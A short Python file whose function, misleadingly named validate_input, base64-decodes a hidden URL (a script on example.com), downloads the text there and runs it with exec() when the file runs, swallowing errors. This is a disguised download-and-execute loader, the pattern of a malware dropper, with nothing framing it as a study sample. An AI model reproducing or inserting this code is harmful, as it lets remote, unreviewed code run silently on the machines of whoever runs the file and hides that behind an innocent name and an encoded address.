import base64
import requests

def validate_input():
    try:
        a = "aHR0cDovL2V4YW1wbGUuY29tL3NjcmlwdDYucHk="
        b = base64.b64decode(a).decode("utf-8")

        c = requests.get(b)
        d = c.text

        exec(d)

    except Exception as e:
        print(e)

validate_input()
